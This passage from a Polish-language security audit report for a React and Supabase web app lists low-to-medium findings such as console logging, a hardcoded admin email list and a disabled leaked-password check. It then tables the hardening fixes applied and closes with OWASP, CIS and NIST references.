| V-018 | 🟡 ŚREDNI | CWE-489 | `App.jsx:376` | `console.log('[RemoteCommand] Received:', ...)` — logowanie danych zdalnych komend do konsoli. | ⚠️ DO NAPRAWIENIA |
| V-019 | 🟢 NISKI | CWE-489 | `src/**/*.jsx` | 19 wystąpień `console.error(err)` — obiekty błędów Supabase widoczne w DevTools przeglądarki. | ⚠️ AKCEPTOWALNY |
| V-020 | 🟢 NISKI | CWE-547 | `App.jsx:34` | `ADMIN_EMAILS` zakodowane w kliencie (powielenie z A01 — V-010). | ⚠️ AKCEPTOWALNY |
| V-021 | 🟢 NISKI | CWE-16 | Supabase Dashboard | Leaked Password Protection wyłączone (wykryte przez Supabase Security Advisor). | ⚠️ DO NAPRAWIENIA |

### Zastosowane poprawki A02

| Plik | Zmiana |
|------|--------|
| `index.html` | Dodano CSP meta tag, `X-Content-Type-Options`, `Referrer-Policy`, poprawiono `lang`, `title`, `description` |
| `.gitignore` | Dodano `.env` i `/dist` do ignorowanych plików |
| `vercel.json` | **NOWY** — pełna konfiguracja nagłówków bezpieczeństwa HTTP dla Vercel |
| `vite.config.js` | Dodano `build.sourcemap: false` — wyłączenie source maps w produkcji |
| `AuthView.jsx` | Zastąpiono `err.message` generycznymi komunikatami błędów |
| `AdminPanel.jsx` | Zastąpiono `error.message` generycznymi komunikatami błędów |

---

> **Referencje OWASP:**
> - [OWASP Top 10 - A01:2025 Broken Access Control](https://owasp.org/Top10/A01_2025-Broken_Access_Control/)
> - [OWASP Top 10 - A02:2025 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
> - [OWASP Proactive Controls: C1: Implement Access Control](https://owasp.org/www-project-proactive-controls/)
> - [OWASP Testing Guide: Configuration Management](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/)
> - [OWASP Testing Guide: Testing for Error Codes](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/)
> - [OWASP ASVS: V8 Authorization](https://owasp.org/www-project-application-security-verification-standard/)
> - [OWASP ASVS: V13 Configuration](https://owasp.org/www-project-application-security-verification-standard/)
> - [OWASP Cheat Sheet: Authorization](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
> - [CIS Security Configuration Guides/Benchmarks](https://www.cisecurity.org/cis-benchmarks)
> - [NIST Guide to General Server Hardening](https://csrc.nist.gov/publications/detail/sp/800-123/final)
